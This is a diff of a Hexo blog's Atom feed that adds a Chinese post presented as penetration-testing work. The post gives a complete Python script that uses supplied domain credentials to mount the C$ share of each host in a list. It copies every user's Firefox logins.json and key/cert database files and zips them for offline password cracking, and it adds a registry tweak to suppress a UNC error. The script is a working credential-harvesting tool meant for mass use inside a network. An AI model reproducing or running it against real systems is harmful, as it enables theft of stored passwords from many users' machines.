@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="OneHone.github.io/"/>
-  <updated>2019-06-20T04:44:04.443Z</updated>
+  <updated>2019-08-22T14:18:34.000Z</updated>
   <id>OneHone.github.io/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>批量IPC获取域内机器Firefox密码</title>
+    <link href="OneHone.github.io/2019/09/06/%E6%89%B9%E9%87%8FIPC%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85%E6%9C%BA%E5%99%A8Firefox%E5%AF%86%E7%A0%81/"/>
+    <id>OneHone.github.io/2019/09/06/批量IPC获取域内机器Firefox密码/</id>
+    <published>2019-09-06T14:16:04.000Z</published>
+    <updated>2019-08-22T14:18:34.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>在渗透测试中，获取机器浏览器密码是一项必不可少的工作，但考虑在域环境下，机器数量多，一台台获取显然效率不够，于是用<code>python</code>写了个自动化脚本。</p><h3 id="解密条件"><a href="#解密条件" class="headerlink" title="解密条件"></a>解密条件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">低版本firefox：logins.json、key3.db、cert8.db</span><br><span class="line">高版本firefox：logins.json、key4.db、cert9.db</span><br><span class="line">其中logins.json是关键，没有它则获取不到浏览器密码</span><br></pre></td></tr></table></figure><h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import os,sys</span><br><span class="line">from threading import Thread</span><br><span class="line">import zipfile</span><br><span class="line"></span><br><span class="line">user = sys.argv[1]</span><br><span class="line">pwd = sys.argv[2]</span><br><span class="line">file_open=(&apos;C:\\Users\\public\\downloads\\host.txt&apos;)</span><br><span class="line">def file_name():</span><br><span class="line">for host in open(file_open):</span><br><span class="line">host = host.strip(&apos;\n&apos;)</span><br><span class="line">os.system(&quot;net use \\\\%s %s /user:%s&quot;%(host,pwd,user))</span><br><span class="line">for root, dirs, files in os.walk(&apos;\\\\%s\\c$\\users&apos;%host):</span><br><span class="line">try:</span><br><span class="line">for files in files:</span><br><span class="line">if files == &apos;logins.json&apos;:</span><br><span class="line">os.chdir(root)</span><br><span class="line">print (root+&quot;\\&quot;+&apos;logins.json&apos;)</span><br><span class="line">os.system(&quot;copy %s\\logins.json c:\\users\\public\\downloads\\logins.json%s&quot;%(root,host))</span><br><span class="line">os.system(&quot;copy %s\\key3.db c:\\users\\public\\downloads\\key3.db%s&quot;%(root,host))</span><br><span class="line">os.system(&quot;copy %s\\cert8.db c:\\users\\public\\downloads\\cert8.db%s&quot;%(root,host))</span><br><span class="line">os.system(&quot;copy %s\\key4.db c:\\users\\public\\downloads\\key4.db%s&quot;%(root,host))</span><br><span class="line">os.system(&quot;copy %s\\cert9.db c:\\users\\public\\downloads\\cert9.db%s&quot;%(root,host))</span><br><span class="line">os.system(&quot;net use \\\\%s /del&quot;%host)</span><br><span class="line">except:</span><br><span class="line">pass</span><br><span class="line">finally:</span><br><span class="line">zipDir(&apos;C:\\Users\\public\\downloads&apos;,&apos;C:\\Users\\public\\Documents\\key.zip&apos;)</span><br><span class="line"></span><br><span class="line">def zipDir(dirpath,outFullName):</span><br><span class="line">    zip = zipfile.ZipFile(outFullName,&quot;w&quot;,zipfile.ZIP_DEFLATED)</span><br><span class="line">    for root, dirs, files in os.walk(dirpath):</span><br><span class="line">    fpath = root.replace(dirpath,&apos;&apos;)</span><br><span class="line">        for files in files:</span><br><span class="line">            zip.write(os.path.join(root,files),os.path.join(fpath,files))</span><br><span class="line">    zip.close()</span><br><span class="line"></span><br><span class="line">t=Thread(target=file_name)</span><br><span class="line">t.start()</span><br></pre></td></tr></table></figure><p>使用说明：将host.txt放在C:\Users\public\downloads目录下，代码会循环判断机器中的logins.json文件，如存在，则批量获取密码配置文件并自动打包（C:\Users\public\Documents\下的key.zip文件）。为防止文件覆盖及标识文件，复制出来的key、cert会按照IP重命名，破解时自行改回。<br>exp运行可能会存在报错：用作为当前目录的以上路径启动了CMD.EXE。UNC路径不受支持。默认值设为Windows目录。<br><img src="/images/批量IPC获取域内机器Firefox密码/1.PNG" alt=""><br>报错原因：网络路径下的问题。解决方法:<code>reg add &quot;hkey_current_user\software\microsoft\command processor&quot; /v &quot;disableunccheck&quot; /t &quot;reg_dword&quot; /d &quot;1&quot; /f</code><br>报错问题不大，并不影响使用。</p><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="/images/批量IPC获取域内机器Firefox密码/2.gif" alt=""></p><h3 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h3><p><img src="/images/批量IPC获取域内机器Firefox密码/3.gif" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;在渗透测试中，获取机器浏览器密码是一项必不可少的工作，但考虑在域环境下，机器数量多，一台台获取显然效率不够，于是用&lt;code&gt;python&lt;/code&gt;写了个自动化脚本。&lt;/p&gt;
+&lt;h3 id=&quot;解密条件&quot;&gt;&lt;a href=&quot;#解密条件&quot; class=&quot;headerlink
+      
+    
+    </summary>
+    
+      <category term="编程之道" scheme="OneHone.github.io/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
+    
+    
+      <category term="IPC" scheme="OneHone.github.io/tags/IPC/"/>
+    
+      <category term="PYTHON" scheme="OneHone.github.io/tags/PYTHON/"/>
+    
+  </entry>
   
   <entry>
     <title>获取MySQL-Workbench本地保存密码</title>
